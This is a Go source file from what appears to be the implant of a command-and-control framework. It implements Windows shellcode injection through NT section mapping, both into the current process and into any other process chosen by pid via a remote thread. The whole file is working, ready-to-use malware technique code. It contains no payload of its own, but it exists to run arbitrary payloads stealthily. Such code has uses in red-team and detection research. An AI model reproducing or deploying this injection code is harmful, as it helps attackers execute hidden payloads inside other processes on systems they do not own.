//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// MapInjectLocal executes shellcode in the current process via a mapped section.
//
// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
// NtUnmapViewOfSection → NtMapViewOfSection(RX, self) → NtCreateThreadEx.
func MapInjectLocal(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()

	hSection, err := winsyscall.NtCreateSec(uintptr(len(shellcode)), winsyscall.PageExecuteReadWrite)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hSection)

	localBase, err := winsyscall.NtMapView(hSection, hSelf, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	winsyscall.NtUnmap(hSelf, localBase)

	rxBase, err := winsyscall.NtMapView(hSection, hSelf, uintptr(len(shellcode)), winsyscall.PageExecRead)
	if err != nil {
		return err
	}

	hThread, err := winsyscall.NtCreateThread(hSelf, rxBase)
	if err != nil {
		winsyscall.NtUnmap(hSelf, rxBase)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}

// MapInjectRemote injects shellcode into pid via cross-process section mapping.
//
// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
// NtUnmapViewOfSection(self) → NtMapViewOfSection(RX, remote) → NtCreateThreadEx(remote).
func MapInjectRemote(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()

	hSection, err := winsyscall.NtCreateSec(uintptr(len(shellcode)), winsyscall.PageExecuteReadWrite)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hSection)

	localBase, err := winsyscall.NtMapView(hSection, hSelf, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	winsyscall.NtUnmap(hSelf, localBase)

	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	remoteBase, err := winsyscall.NtMapView(hSection, hProc, uintptr(len(shellcode)), winsyscall.PageExecRead)
	if err != nil {
		return err
	}

	hThread, err := winsyscall.NtCreateThread(hProc, remoteBase)
	if err != nil {
		winsyscall.NtUnmap(hProc, remoteBase)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}
